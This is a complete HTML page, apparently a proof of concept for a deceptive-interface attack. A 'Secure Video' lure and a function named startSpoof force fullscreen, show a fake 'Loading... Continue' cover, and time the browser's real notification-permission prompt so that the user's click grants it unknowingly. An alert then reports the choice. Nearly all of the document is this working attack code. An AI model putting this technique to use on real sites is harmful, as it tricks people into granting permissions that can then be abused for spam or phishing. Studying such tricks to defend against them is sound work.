<!DOCTYPE html>
<html>
<head>
  <title>Secure Video</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: black;
      color: white;
      font-family: Arial, sans-serif;
    }
    #container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .deceptive-btn {
      padding: 16px 32px;
      font-size: 18px;
      border: none;
      background: #00cc99;
      color: white;
      border-radius: 6px;
      cursor: pointer;
      z-index: 9999;
    }
    #cover {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: black;
      z-index: 9998;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
  </style>
</head>
<body>
  <div id="container">
    <h1>ðŸ”’ Watch Secure Video</h1>
    <button class="deceptive-btn" onclick="startSpoof()">Start Secure Session</button>
  </div>

  <div id="cover">
    <h2>Loading...</h2>
    <button class="deceptive-btn">Continue</button>
  </div>

  <script>
    function startSpoof() {
      const cover = document.getElementById('cover');
      document.documentElement.requestFullscreen().then(() => {
        setTimeout(() => {
          cover.style.display = 'flex';

          // Trigger the real notification permission prompt underneath deceptive button
          setTimeout(() => {
            Notification.requestPermission().then(res => {
              alert("User chose: " + res);
            });
          }, 100); // Delay triggers while user clicks Continue
        }, 500);
      });
    }
  </script>
</body>
</html>
